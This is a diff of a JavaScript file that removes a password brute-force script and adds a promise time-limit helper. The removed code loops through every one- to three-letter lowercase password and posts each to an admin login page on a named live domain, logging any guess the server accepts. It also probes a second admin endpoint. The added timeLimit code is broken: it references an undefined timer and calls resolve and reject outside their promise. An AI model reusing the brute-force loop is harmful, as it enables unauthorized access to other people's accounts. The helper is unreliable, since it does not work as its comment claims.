@@ -1,119 +1,23 @@
-// var addBinary = function(a, b) {
-//     let firstNumber = parseInt(a,2)
-//     let secondNumber = parseInt(b,2)
-//     console.log(firstNumber,secondNumber)
-    
-//     // let result = firstNumber + secondNumber
-//     // return result.toString(2)
-// };
+var timeLimit = function(fn, t) {
+	return async function(...args) {
+        new Promise((resolve,rejected) => {
+          setTimeout(() => {
+            rejected("Time Limit Exceeded")
+          },t)
+        })
 
-// console.log(addBinary('10100000100100110110010000010101111011011001101110111111111101000000101111001110001111100001101','110101001011101110001111100110001010100001101011101010000011011011001011101111001100000011011110011'))
-
-function generateCombinations(length) {
-      const alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
-      // const alphabet = ['d','k'];
-      
-      const combinations = [];
      
-      function generate(prefix, remainingLength) {
-       if (remainingLength === 0) {
-        combinations.push(prefix);
-        // fetchData(prefix)
-        
-        return;
-       }
-     
-       for (let i = 0; i < alphabet.length; i++) {
-        const nextPrefix = prefix + alphabet[i];
-        generate(nextPrefix, remainingLength - 1);
-       }
-      }
-     
-      for (let i = 1; i <= length; i++) {
-       generate('', i);
-      }
-     
-      return combinations;
-}
-     
-     // Usage
-     const result = generateCombinations(3);
-    
-    // result.forEach(req => {
-      
-    // })
-    fetchData(result)
-    
-    function delay(ms) {
-      return new Promise(resolve => setTimeout(resolve, ms));
-     }
-     
-     async function fetchData(result) {
-      for (const item of result) {
-       let headersList = {
-        "Accept": "*/*",
-        "User-Agent": "Thunder Client (https://www.thunderclient.com)"
-       };
-       
-       let bodyContent = new FormData();
-       bodyContent.append("name", "admin");
-       bodyContent.append("password", `${item}`);
-       bodyContent.append("login", "");
-       
-       while (true) {
-        try {
-         let response = await fetch("https://designshoretest.com/01dk/glass/admin.php", { 
-          method: "POST",
-          body: bodyContent,
-          headers: headersList
-         });
-         
-         let data = await response.text();
-         if (!data.includes('Wrong Password')) {
-          console.log(item);
-          break;
-         }
-         
-         // Request succeeded, break out of the loop
-         break;
-        } catch (error) {
-         if (error.code === 'ENOBUFS') {
-          // Request buffer is full, wait for a while and retry
-          await delay(2000); // Wait for 1 second (adjust the delay as needed)
-         } else {
-          // Handle other errors
-          // console.error(error);
-          return;
-         }
-        }
-       }
-      }
-     }
-     
-    
-    
-     
-     
-    async function test(name){
-      let headersList = {
-        "Accept": "*/*",
-        "User-Agent": "Thunder Client (https://www.thunderclient.com)"
-       }
-       
-       let bodyContent = new FormData();
-       bodyContent.append("name", "dkd");
-       bodyContent.append("password", `${name}`);
-       bodyContent.append("login", "");
-       
-       let response = await fetch("https://designshoretest.com/01dk/passwordsetup/admin.php", { 
-        method: "POST",
-        body: bodyContent,
-        headers: headersList
-       });
-       
-       let data = await response.text();
-       if(data.includes('Welcome To Admin'))
-       console.log(data)
-      //  console.log((data.includes('Welcome To Admin')) ? name : "false");
+        fn(...args)
+        .then((result) => {
+          clearTimeout(timer); // Clear the timer if fn completes before the time limit
+          resolve(result);
+        })
+        .catch((error) => {
+          clearTimeout(timer); // Clear the timer in case of an error too
+          reject(error);
+        });
     }
-    
+};
+
+const limited = timeLimit((t) => new Promise(res => setTimeout(res, t)), 100);
+limited(150).catch(console.log) // "Time Limit Exceeded" at t=100ms
